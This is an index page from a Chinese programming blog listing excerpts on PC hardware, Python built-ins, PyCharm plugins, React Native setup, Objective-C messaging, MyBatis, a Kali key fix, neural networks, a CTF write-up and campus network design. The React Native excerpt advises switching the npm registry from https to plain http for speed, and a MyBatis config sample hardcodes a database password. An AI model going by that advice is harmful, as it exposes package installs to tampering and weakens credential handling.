<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/52c080ad276933f4f892381d8a227e15/" rel="bookmark">
			台式机的主要配件有哪些，各有什么功能？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		(1)电源:电源是电脑中不可缺少的供电设备，它的作用是将220V交流转换为电脑中使用的5V，12V，3.3V直流电，其性能的好坏，直接影响到其他设备工作的稳定性，进而会影响整机的稳定性。
(2)主板:主板是电脑中各个部件工作的一个平台，它把电脑的各个部件紧密连接在一起，各个部件通过主板进行数据传输。也就是说，电脑中重要的“交通枢纽”都在主板上，它工作的稳定性影响着整机工作的稳定性
(3)CPU:CPU(Central Precessing Unit)即中央处理器，其功能是执行算，逻辑运算，数据处理，传四舍五入，输入/输出的控制电脑自动，协调地完成各种操作。作为整个系统的核心，CPU 也是整个系统最高的执行单元，因此CPU已成为决定电脑性能的核心部件，很多用户都以它为标准来判断电脑的档次。
(4)内存:内存又叫内部存储器(RAM)，属于电子式存储设备，它由 电路板 和芯片组成，特点是体积小，速度快，有电可存，无电清空，即电脑在开机状态时内存中可存储数据，关机后将自动清空其中的所有数据。
(5)硬盘:硬盘属于外部存储器，由金属磁片制成，而磁片有记功能，所以储到磁片上的数据，不论在开机，还是并机，都不会丢失。
(6)声卡:声卡是组成多媒体电脑必不可少的一个硬件设备，其作用是当发出播放命令后，声卡将电脑中的声音数字信号转换成模拟信号送到音箱上发出声音。
(7)显卡:显卡在工作时与 显示器 配合输出图形，文字，其作用是负责将CPU送来的数字信号转换成显示器识别的模拟信号，传送到显示器上显示出来。
(8)调制解调器:调制解调器是通过 电话线 上网时必不可少的设备之一。它的作用是将电脑上处理的数字信号转换成电话线传输的模拟信号。　(9)网卡:网卡的作用是充当电脑与 网线 之间的桥梁，它是用来建立局网的重要设备之一。
(10)软驱:软驱用来读取软盘中的数据。软盘为可读写外部存储设备。
(11)光驱:光驱是用来读取光盘中的设备。光盘为只读外部存储设备，其容量为650MB左右。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/788665e216af9809c78d5c371c590430/" rel="bookmark">
			68个Python内置函数，建议你吃透！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		点击上方“小白学视觉”，选择加"星标"或“置顶”
重磅干货，第一时间送达 内置函数就是Python给你提供的, 拿来直接用的函数，比如print，input等。
截止到python版本3.6.2 ，一共提供了68个内置函数，具体如下👇
abs() dict() help() min() setattr() all() dir() hex() next() slice() any() divmod() id() object() sorted() ascii() enumerate() input() oct() staticmethod() bin() eval() int() open() str() bool() exec() isinstance() ord() sum() bytearray() ﬁlter() issubclass() pow() super() bytes() ﬂoat() iter() print() tuple() callable() format() len() property() type() chr() frozenset() list() range() vars() classmethod() getattr() locals() repr() zip() compile() globals() map() reversed() __import__() complex() hasattr() max() round() delattr() hash() memoryview() set() 本文将这68个内置函数综合整理为12大类，正在学习Python基础的读者一定不要错过，建议收藏学习！
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/788665e216af9809c78d5c371c590430/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0c5ec8bc0fd7b426570aa81e50644353/" rel="bookmark">
			电子信息/通信工程【保研面试真题】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我是@小吴学长er，本科通信工程，夏令营保研上岸浙江大学，拿到中科大、东南、成电等10余所学校offer，相关经历可参见以下经验贴：
小吴学长er：2022年（23届）电子信息/通信工程保研|四非上岸浙大的保研之旅（浙大、中科大、哈工大、东南、南开、西电、成电等）13 赞同 · 8 评论文章正在上传…重新上传取消https://zhuanlan.zhihu.com/p/593638617
最近有学弟学妹开始陆陆续续的开始导师单面和团队面试了 然后来问学长有没有相应学院的面试真题所以今天来聊一聊这个话题 分为以下几个部分:
收集面试真题有必要吗?我只想报某学院 是不是只用看这个学院的真题就行了?拿到真题之后该如何使用和复习? 一、收集面试真题有必要吗? 首先，收集面试真题有必要吗? 答案是肯定的，就像我们高考/考研一样也都会去学习往年的真题一样，每个学院的面试都会有其相应的特点。
比如东南信院、浙大工院、成电通院/抗千扰国重、中科大等等这些学院考核的侧重点其实都不太一样(因为学长都面过参)，面试内容会有一定的差异。
比如南开电信学院的老师做车联网的特别多，所以面试的时候很多同学都会被问到对这个领域的了解再比如北航北理电信院对数理基础的要求比较高，会问很多高数/线代/概率论的问题 学长在面东南抽题时就遇到了面试真题里面的两个原题，其中有一个还是英文的问题，专业课回答的不错在当时面试过程中也给了我很大的信心。
但是，请不要过度依赖面试真题，忽略了对专业课本身的复习！！！
虽然每年面试的老师都是学院的那一拨老师，问的内容也是祖传的核心知识点，但是问法和内容不可能是一成不变的，比如前几天有学弟面完给我反馈：
所以千万不要投机取巧只看面试真题去复习对应的知识点，专业课还是要老老实实的复习好
二、我只想报某学院 是不是只用看这个学院的真题就行了？ 我想去成电，是不是我收集成电一个学校的真题就 OK了？
答案是否定的，很多同学都有这样一个错误的观点：我目标学校是A校，所以我只需看A校的面试真题就没问题了，这种想法是不对的。
因为一个学校的面试题是有限的，要注意同档次学校的面试真题，多看几个学校的题目了才能归纳总结出常见的问法
三、拿到真题之后该如何使用和复习? 这个问题很好理解，学长比较建议大家可以先看一看面试真题，然后带着问题去复习专业课，在复习中寻找答案，这样既能够加深印象，又能够增强自己对知识点的理解（学长就是这样复习的）
有的学弟学妹想等入营了之后再去开始看对应院校的面试真题，我其实是不推荐这种方法的。因为从入营到面试往往时间很短非常紧张，要准备的事情很多很多而且线下之后会开展一下夏令营活动导致复习时间大大降低，所以还是建议尽早复习为好。
当然也欢迎有其他更好的使用方法！
面试真题
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/55e991d34ff8a10ad3178e2c909e6fd0/" rel="bookmark">
			墙裂推荐！pycharm装上这 14 个插件后，简直就是无敌的存在！！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		pycharm是一款强大的python集成开发环境，带有一整套python开发工具，今天就给大家介绍几款非常好用的插件。
首先插件的下载方法 进入File -&gt; Settings -&gt; Plugins，根据需要搜索插件名称（记得是在Marketplace中搜索），然后点击Install按钮，需要重启才能生效。
Mongo Plugin MongoDB是一款非常流行的非关系型数据库，而Mongo Plugin是在Pycharm中对MongoDB进行可视化操作工具，通过它能可以很方便地对数据库进行可视化操作。
IdeaVim linux中的vim大家该听过吧，而 IdeaVim 就可以让你在 Pycharm 中操作 Vim 的功能。
在tools中勾选Vim Emulator即可使用，取消勾选回到正常编辑状态。关于vim的使用可以参考这篇文章Linux之vim快速入门。
Statistic statistic项目统计插件，统计整体代码量，包括所有文件的统计数量和行数。点击左下角的statistic &gt;&gt;&gt;&gt;refresh即可。
Json Parser JSON Parser是一个用于验证和格式化JSON字符串的轻量级插件。
activate-power-mode 炫酷的编码效果，简直停不下来，不过眼睛很容易疲劳，谨慎使用！
Translation 一款用于翻译的插件，包括谷歌翻译、有道翻译，直接在 Pycharm 中选择需要翻译的内容，右键点击翻译Translate进行翻译。
Rainbow Brackets Rainbow Brackets可以让代码块之间清晰的显示出各种颜色，比如括号相同颜色，选中区域代码高亮的功能等，并且支持支持Java, Python, JavaScript,Go, PHP等多种编程语言。
Background Image Plus 该插件是用来设置IDEA和PyCharm的背景图片，安装好后，点击View–&gt;Set Background Image选择自己喜欢的照片即可，还可以调节其透明度。
Material Theme UI Material Theme UI是一个主题插件，在很多编辑器中都可以使用，暗黑色，还是很有质感的，大家不喜欢默认主题的，可以尝试下。
上面就是几个比较常用的idea插件，大家感兴趣的话，可以根据需要下载使用。
以上所有的文件都已经打包好了，需要的朋友请移步文末。
写在最后 今天小编也给大家分享一份Python学习资料和公开课，里面的内容都是适合零基础小白的笔记和资料，不懂编程也能听懂、看懂。如果需要的话直接划到文末免费获得，让我们一起学习！
一、Python所有方向的学习路线
Python所有方向路线就是把Python常用的技术点做整理，形成各个领域的知识点汇总，它的用处就在于，你可以按照上面的知识点去找对应的学习资源，保证自己学得较为全面。
二、学习软件 工欲善其事必先利其器。学习Python常用的开发软件都在这里了，给大家节省了很多时间。
三、全套PDF电子书 书籍的好处就在于权威和体系健全，刚开始学习的时候你可以只看视频或者听某个人讲课，但等你学完之后，你觉得你掌握了，这时候建议还是得去看一下书籍，看权威技术书籍也是每个程序员必经之路。
四、入门学习视频 我们在看视频学习的时候，不能光动眼动脑不动手，比较科学的学习方法是在理解之后运用它们，这时候练手项目就很适合了。
四、实战案例 光学理论是没用的，要学会跟着一起敲，要动手实操，才能将自己的所学运用到实际当中去，这时候可以搞点实战案例来学习。
五、清华编程大佬出品《漫画看学Python》 用通俗易懂的漫画，来教你学习Python，让你更容易记住，并且不会枯燥乏味。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/55e991d34ff8a10ad3178e2c909e6fd0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/15fef669252b8e6ec6b4d9f590ce7273/" rel="bookmark">
			RN_iOS项目部署流程实例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1、环境配置1.1 安装node1.2 安装Watchman1.3 安装npm1.4 安装cocoapods 2、百家云demo下载3、运行百家云demo3.1 顺利的话3.2 踩过的坑（按这个目录流程走）3.2.1 npm install -g react-native-cli3.2.2 安装：npm install3.2.3 npm降级：sudo npm install npm@3.8.6 -g出错3.2.4 降级后重新安装：npm install3.2.5 ios目录下pod install出错3.2.6 react-native-gesture-handler出错3.2.7 react-native run-ios一直加载 4、其他问题（不一定出现）4.1 目录文件缺失4.2 unable to open file in target xcode4.3 端口冲突 5、说明 1、环境配置 1.1 安装node brew install node
1.2 安装Watchman brew install watchman
1.3 安装npm sudo npm install npm -g
速度过慢可以切换源，https -&gt; http，这样网速就会好很多
npm config set registry http://registry.npmjs.org
如果使用 npm 安装node_modules 总是提示报错：报错:npm resource busy or locked。可删除以前安装的 node_modules 再重新安装
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/15fef669252b8e6ec6b4d9f590ce7273/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/60dc7d13d5706ced985257bee1c27893/" rel="bookmark">
			OC消息机制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1 OC消息机制2 OC消息发送3 OC动态方法解析4 OC消息转发 1 OC消息机制 OC对象调用方法在编译阶段不知道具体的方法在哪里，是在运行的过程中，向对象发送消息，通过对象得到函数地址，调用函数，如果没有找到，则抛出异常。
OC中方法调用，其实都是转成了objc_msgSend函数的调用， 给receiver 【方法调用者】 发送了一条消息 【selector 方法名】。
objc_msgSend 底层有3大阶段：
OC 消息发送动态方法解析消息转发 类的数据结构: 类对象中，存储着isa, superclass , 属性、对象方法、协议、成员变量等
struct objc_class { Class isa; //类的isa指向它的metaclass Class superclass; //指向类的超类 cache_t cache; // 方法缓存 - 方法缓存列表，散列表（哈希表）数据结构，缓存自己之前调用过的方法，指向最近使用的方法的指针，用于提升效率 class_data_bits_t; // 获取具体的类信息 } 2 OC消息发送 如何通过对象找到调用函数的地址？
[selector 方法名]会返回一个SEL变量，这个变量是char *的形式将方法对应为唯一的值，以键值对的形式存储函数地址。类对象中的isa就是指向对象的类的指针isa。
发送过程：
1、在程序运行时会给每个类的结构体分配一块空间，对象的isa指向的就是这块空间
2、当发送调用方法的消息后，根据receiver对象的isa指针获取它对应的class
3、通过SEL查找函数，优先在class的cache查找message方法，如果找不到，再到methodLists查找，若还不能找到，再去superClass中查找，找到后会将method放到对应objc_class的cache中，方便下次查找。
4、一旦找到message这个方法，再依据receiver 中的self 指针找到当前的对象,调用当前对象的具体实现的方法(IMP),然后传递参数,调用实现方法。
当对象收到无法解读的消息的时候，则需要启动消息转发。
1、首先判断调用的方法对象是否为nil, 如果为nil,则直接退出，通过实例对象的isa 找到类对象，在类对象的cache 列表中查找，如果找到直接调用，
2、如果cache 列表中没有，则在这个类对象的方法列表中查找，如果找到调用，并将此方法放在自己的cache 中，方便之后查找
3、如果类对象方法列表中没有，则通过类对象的superclass 指针，找到父类的类对象， 先cache 中查找，再方法列表中查看。如果在父类中找到了方法，则调用，并将方法缓存到自己的cache中，方便之后查找。
4、如果superclass 为nil, 则进入动态方法解析阶段。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/60dc7d13d5706ced985257bee1c27893/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/156b130f2a8f85295cbecb967fef183a/" rel="bookmark">
			AFURLSessionManager简述
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		AFURLSessionManager是基于NSURLSession API的封装，用于管理网络请求任务的类。它可以轻松地在iOS和macOS应用程序中执行HTTP、HTTPS、FTP和文件下载请求，并支持后台任务执行和断点续传。AFURLSessionManager可以配置请求的缓存策略、超时时间、安全策略、身份验证等，并支持上传和下载进度的监控。
如下图所示：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c350b8f2f2872f6f27fed462a6093ac1/" rel="bookmark">
			【MyBatis】一文学会使用MyBatis操作数据库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. MyBatis是什么？2. 为什么要学MaBatis？3. MyBatis环境搭建4. MyBatis的使用4.1 简单示例4.2 获取动态参数4.2.1 ${xxx}获取动态参数4.2.2 #{xxx}获取动态参数4.2.3 #{xxx}与${xxx}获取字符串类型数据4.2.4 sql注入问题4.2.5 模糊查询like4.2.6 #{}与${}区别总结 5. 修改操作（增删改）6. 查询操作6.1 resultType与resultMap6.2 单表查询6.3 多表查询 7. 动态SQL7.1 \&lt;if&gt;标签7.2 \&lt;trim&gt;标签7.3 \&lt;where&gt;标签7.4 \&lt;set&gt;标签7.5 \&lt;foreach&gt;标签 1. MyBatis是什么？ MyBatis是一款持久层框架，它可更简单的完成程序与数据库之间交互的操作，它可以更简单的操作与读取数据库，它还支持自定义SQL，存储过程及高级映射
2. 为什么要学MaBatis？ 对于后端开发来说，完整的程序由以下两部分组成：
后端程序数据库 后端程序与数据库之间的通讯，就得依靠数据库连接工具，像之前学习的JDBC，但是因为JDBC使用起来太繁琐了，简单回顾使用JDBC操作数据库的步骤：
创建数据库连接池DataSource使用DataSource获取数据库连接Connection编写预编译的sql使用Connection及sql创建操作命令对象Statement替换占位符使用Statement执行sql如果是查询，则返回并处理结果集释放资源 所以呢，使用MaBatis简化上述操作，方便快速的操作数据库
3. MyBatis环境搭建 创建Spring Boot项目的时候，添加MySQL驱动依赖与MyBatis框架依赖
创建好项目后，如果直接启动项目会报错，因为启动项目时候要连接数据库，此时我们还没有配置数据库源
在配置文件application.properties中配置数据库连接信息
# 配置数据库连接信息 spring.datasource.url=jdbc:mysql://localhost:3306/blog?characterEncoding=utf8&amp;useSSL=false spring.datasource.username=root spring.datasource.password=xiaobai520..@@@ # 配置数据库驱动 spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver 在配置文件application.properties中配置MyBatis的xml文件路径
# 配置mybatis xml路径 # 在根路径下有mybatis文件夹，里面有xxxMapper.xml文件 mybatis.mapper-locations=classpath:/mybatis/*Mapper.xml 配置MyBatis中sql执行打印
#配置mybatis sql执行打印 mybatis.configuration.log-impl=org.apache.ibatis.logging.stdout.StdOutImpl # sql打印日志的级别为debug，但是spring boot默认的打印级别为info # 设置com.example.demo包下的打印级别为debug logging.level.com.example.demo=debug 4. MyBatis的使用 4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c350b8f2f2872f6f27fed462a6093ac1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e4d1786123a00448aaaa2998f3d62790/" rel="bookmark">
			kali提示无法安全的用该源进行更新,所以默认禁用该源解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		更新源时提示
获取:1 http://mirrors.aliyun.com/kali kali-rolling InRelease [30.5 kB] 错误:1 http://mirrors.aliyun.com/kali kali-rolling InRelease 下列签名无效： EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt; 正在读取软件包列表... 完成 W: GPG 错误：http://mirrors.aliyun.com/kali kali-rolling InRelease: 下列签名无效： EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt; E: 仓库 “http://mirrors.aliyun.com kali-rolling InRelease” 没有数字签名。 N: 无法安全地用该源进行更新，所以默认禁用该源。 N: 参见 apt-secure(8) 手册以了解仓库创建和用户配置方面的细节。 百度很多都说删掉/etc/apt/sources.list.d就可以了，实际啥用也没有
后来找到一个方法，从官网下载签名并安装：
root@kali:~# wget archive.kali.org/archive-key.asc root@kali:~# apt-key add archive-key.asc	解决：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b33a1a37298f01f9d36845691fc17830/" rel="bookmark">
			BP神经网络教学
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		逻辑回归与神经网络 代码下载（免费）：(43条消息) BP神经网络的简单应用资源-CSDN文库
逻辑回归主要是一种线性回归，他的分类特征并不是特别好。而神经网络是一种非线性的回归对各种数据处理良好。下面是以一个二维数据说明两者的具体区别。
数据集表述 如图所示是一个二维数据，X中储存了关于这个花的横坐标和纵坐标，Y储存了关于上述X中每个点的颜色，要求：将蓝色和红色的点进行区分。
线性回归表现 定义我们的算法模型，直接从sklearn库中导入类LinearRegression即可，由于线性回归比较简单，所以这个类的输入参数也比较少，不需要多加设置。 定义好模型之后直接训练，就能得到我们拟合的一些参数。
我们可以比较明显的看出，这个线性逻辑回归处理非线性问题还是有较大的误差如图所示，误差可以达到47%。效果并不是很理想
神经网络表现 下面我们搭建一个仅含一个隐藏层的神经网络，并在同一数据集下判断神经网络的性能。
以上是关于神经网络的架构示意图，可以看出该神经网络仅含有两层，仅仅有一层隐藏层，根据我们先前已知的信息我们知道，神经网络的隐藏层越高处理非线性性能相对来说是增加的（大概率是增加，但有少部分问题会减少），现在我们仅仅设置一层赢含层来判断在这么简单的层数下观察性能的良好程度。
由于先前已知的知识，以及该神经网络架构我们可以利用下面公式来反应神经网络的工作流程。
在模型评价方面我们选用下面的公式来计算成本函数：
流程：1.定义好神经网络架构主要包括输入层的神经元个数，以及隐含层的层数。2.接着是对参数进行初始化，这里的参数指的是权重以及偏置而不是超参数。3.循环：实施前向传播，再计算出成本函数，最后再利用反向传播计算出梯度，紧接着利用梯度来更新权重。
定义神经网络的架构 神经网络架构方面，对于本次问题主要确定好这几个参数分别是1.神经网络的输入层大小，即输入层的神经元个数，再通俗一点来讲就是多少个X。2.第二个是神经网络隐含层的大小，这里我们设置为4个。通常这样的设置是随机设置的，这里的4并没有很深的含义。3.第三个是关于这个输出层的大小。由于这是一个判断问题，所以输出层的大小问题这里设置成1。
输出化模型的参数 在这里我们初始化的是权重和偏置，先前的知识中我们容易知道，权重一般不可全部为0而偏置可以全部为0，这时由于权重为0的时候，隐藏层的大小将失去意义，所有输入都输出一个值。无法进行反向传播。在这里还要注意的一点是，将权重进行初始化的时候尽量要将其转化为一个小的数值，所以这里会乘以0.01，这时由于在激活函数之中，如果权重过于大会导致Z过于大会导致斜率变得极为小，这就不方便进行快速梯度下降。
循环 这里主要分为前向传播，反向传播以及更新参数，值得注意的是这里的操作过程可以参见前面所述的公示。在Z的计算中要注意利用的是矩阵的乘法运算，而不是点积:W1的大小是（隐含层的个数即隐含层的大小，输入层的大小），而X的大小是（X的特征数量，样本个数），他们所得的结果是（隐含层的大小，样本的个数）即Z1,再利用tanh（这里是这个函数，这里并没有很深的含义，仅为方便取用）得到A1，最利用sigmoid函数来取A2由于是二分类问题需要得到一个确定的概率所以是用这个并不改变,数据的大小格式。
计算完前向传播接着是成本函数的计算。这里值得注意的是从单个逻辑回归中计算的叫做损失函数，但一旦向量化，就变成成本函数的计算，值得注意的是成本函数和损失函数并不完全相同，其中有一个求和还有一个1/m的差别。
反向传播 反向传播是利用先前已经得到的六个公式，如图所示。
其中一式利用链式法则可得，LOSS函数对Z求导等于LOSS函数对A求导再乘上A对Z求导，由于LOSS函数的导数为-y/a+(1-y)/(1-a)，A为sigmoid函数，他对Z求导又等于a(1-a)因此可以得到dZ=A-Y。
其中二式可以由矩阵的逆求导可以得出。值得注意的是四式，四式也是由于链式法则求得，其中LOSS函数对Z2求导再乘以dZ2对dA1求导再乘以dA1对dZ1求导即可得到所求解。
其他公式均可以较为简单求到，这里并不在做过多阐述。
更新权重 在先前的基础之上，以及得到各个参数的梯度，下面所要进行的就是对这些所求的参数进行一定的更新迭代。主要利用公式为如下：
拼装好前面上述几个操作： 首先定义好初始的权重和偏置，接着进入循环，这里的循环代数可以自己定义，在这里我们假设为初始值。在一次循环中神经网络的计算过程如下。首先是进行前向传播可以参考前面前向传播的公式，接着是计算成本函数，也可以参考前面的计算公式，然后是计算反向传播，计算该变量的各个梯度，最后是权重更新，利用之前的梯度对每个变量进行更新。以此往复直到达到最后的循环代数
预测 以上的循环其实就是为了获得最后的权值和偏置，这些权重和偏置定义了一个神经网络所以显得十分重要，现在我们可以利用这个确定的神经网络来进行预测了。
预测的过程可以先利用前向传播然后求的A2这里的A2就是预测值，由于只有一层隐藏层，然后通过判断A2是否大于0.5来判断是否是蓝色或者是红色。其中为什么是0.5
因为我们在这里选择的激活函数是sigmoid函数。
超参数优化 在超参数优化的过程中我们可以选择很多超参数，例如学习率、隐含层大小、层数、以及其他激活函数等，这里我们主要是起到一个启发式的思路，利用隐含层的大小作为优化的超参数进行优化。如下图所示可以看出当隐含层的大小为4到5左右的时候神经网络表现最佳。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7a474ecd3c0ce1bd65d1b1d7f2618e3d/" rel="bookmark">
			刷题记录 【LitCTF 2023】导弹迷踪
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		省流：js文件比较多，但是请审完。 进入题目页面，首先看到的是这样 根据题目提示，需要通过6关才能拿到flag。于是点击进去，进入之后是下面这个页面。但是这个游戏也忒难了，玩了几次都没能过6关。
不过一般来说，拿flag都是不用玩游戏的。
于是按照惯例，我们先通过F2打开源代码看看。（以Firefox为例）
在页面的源码里面看了好一会儿，也没看见什么flag。于是我们换个思路，去看看其他文件。
点击查看器右边的调试器，发现在src目录下面有一些js文件，于是我们逐一查看。
终于在game.js里面发现了flag。将其改为NSSCTF形式即可。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/188d61fa92ec0355ceb5eccaa31dc8fc/" rel="bookmark">
			基于eNSP的校园网
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		完整项目拓扑如下：
https://download.csdn.net/download/xiaolong1155/87794750?spm=1001.2014.3001.5503
一 前言 1.1 选题的目的和意义 在传统的校园网网中，网络通常是三层结构。三层网络结构是采用层次化架构的三层网络，有三个层次：核心层(网络的高速交换主干)、汇聚层(提供基于策略的连接)、接入层(将工作站接入网络)。网络结构相对复杂，网络管理人员比较幸苦，需要对各个网络设备进行配置。因此本次设计引入大二层校园网络。
大二层校园网用户全部在核心交换机上认证，汇聚、接入设备不需要维护复杂的网络协议，层次清晰，架构稳定，方便管理，易于扩展和维护。
1.2 主要研究内容 校园网通常包括:校园一卡通、教务管理系统、学生管理系统、办公自动化系统等方面,以及校园社区等与学生生活密切相关的部分。可以说校园网一方面提供信息资源、知识共享等,另一方面也在服务学生日常生活。随着无线网络技术的发展,当前这些应用已经不仅仅局限于计算机操作,也正向着手机用户转变。校园网承担着校园生活的重要使命，其构建目标一方面是功能需求，另一方面是安全保障。在功能方面，校园网应该是建立起数据、语音、视频一体化办公、学习、生活相结合的网络系统。因此其设计建设要本着高起点而又经济实用的标准。具体来说，应用大二层校园网络建设一个易管理，易部署，易维护的校园网络。
二 项目可行性及需求分析 2.1 校园网建设的必要性 随着Internet 技术的发展，推动人们从各个角度去研究计算机网络，以使之在各个领域 得到广泛、成功的应用。校园网的概念是指大、中、小学教育单位的网络，它以应用为 目的，基于 Internet技术的计算机网络和它的使用者以及相关规章制度的集合。校园网是利用网络设备、通信介质和适宜的组网技术与协议以及各类系统管理软件和应用软件，将校园内计算机、计算机教室和各种终端设备有机地集成在一起，并用于教学、教科研、学校管理、信息资源共享和远程教学等方面工作的计算机局域网络系统。校园网是为学校师生提供教学、科研和综合信息服务的宽带多媒体网络。 在我国，学校是处于影响整个社会深刻变革的中心地位，所以是否在学校采用最先进的信息和传播技术是一个有决定性意义的问题。随着计算机多媒体和网络技术的不断发展与普及，校园网信息系统的建设，是非常必要的，也是可行的。
主要表现在：
第一，当前校园网信息系统已经发展到了与校际互联、国际互联、静态资源共享、动态信息发布、远程教学和协作工作的阶段，发展对学校教育现代化的建设提出了越来越高的要求。
第二，教育信息量的不断增多，使各级各类学校、家庭和教育管理部门对教育信息计算机管理和教育信息服务的要求越来越强烈。个人是否具有获得信息和处理信息的能力对于能否成功进入职业界和融入社会都是个决定性的因素,因此学校应该培养所有学生具 有驾驭和掌握这种技术的能力。另一方面，信息技术在作为青少年教育工具的同时也向青少年提供了前所未有的机会。新技术提供的机会以及它们在教学方面具有的优势都是很多的，特别是计算机和多媒体系统的使用有助于个人化的道路，每个学生在个人的学习道路上都可以按照自己的速度发展。
第三，我国各级教育研究部门、软件开发单位、教学设备供应商和各级学校不断开发提供了各种在网络上运行的软件及多媒体系统，并且越来越形象化、实用化，迫切需要网络环境。
第四，现代教育改革的需要。
在校园网中将计算机引入教学各个环节，从而引起了教学方法、教学手段、教学工具的重大革新。 对提高教学质量，推动我国教育现代化的发展起着不可估量的作用。
网络又为学校的管理者和老师提供了获取资源、协同工作的有效途径。 毫无疑问,校园网是学校提高管理水平、工作效率、改善教学质量的有力手段,是解决信息时代教育问题的基本工具。
第五，随着时代的进步、科技的发展，在现代化信息技术管理上，学校将面临新的挑战。 为了提高学校自身的现代化管理水平，丰富教学方法和手段，提高工作效率，及时掌握各种相关信息，提高处理各种业务及突发事件的能力，加强管理，拥有现代化信息技术手段，利用计算机网络与通信技术，全面、迅速、准确地掌握信息，已成为学校内部和教学业务处理的迫切需要。
2.2 传统三层网络存在的问题 网络结构也越来越复杂，管理运维的难度不断加大，校园信息化建设面临着越来越多的挑战。
首先，网络管理问题，校园网目前大多是传统的三层架构，网络结构相对复杂，汇聚层设备做三层网关，启用路由协议，与核心之间三层互通。同时，为了避免环路，接入层与汇聚层设备需要启用复杂的MSTP生成树协议，配置的复杂造成了管理的复杂，网络管理员需要熟知整网的状况以及每台设备的配置情况，以便在出现网络问题时能够快速定位。
其次，网络运营问题，校园网中有学生、教师等多种不同角色，针对不同角色计费方法不同，认证方式也不同，传统校园网为了加强对学生的管控力度，多采用802.1x认证，经过多年的实际运营，网管人员发现802.1x认证问题频出，不仅在接入交换机上启用，大量的接入设备配置复杂，而且客户端也很容易出问题，学生投诉不断。
另外，网络维护问题，传统网络架构中，网络运维管理人员的精力主要消耗在网络设备的功能配置、技术细节和繁琐的问题定位上，无法将工作聚焦，更多的关注用户体验和业务的创新。
2.3 需求分析 主体网络为以千兆为骨干，百兆到桌面的有线网络，覆盖全校所有楼字，选择两台H3C S5700做为核心交换机(主备方式)，承载整个校园网内外网流量的高速转发，同时做为用户业务的网关。五台H3C S5700做为各个楼宇的汇聚设备转发。通过在核心交换机建立动态地址池，通过DHCP下发IP地址。
核心交换机与出口路由器之间通过架设防火墙保障内网安全。为了保证教师与学生安全合理的使用校园网资源，利用安全认证进行用户对校园网的登录和认证。
三 大二层网络结构 3.1 大二层网络结构设计理念 校园网是一种用户高密度的网络，在有限的空间内聚集了大量的终端和用户。扁平化大二层网络的设计注重的是三个“易”：易管理，易部署，易维护。
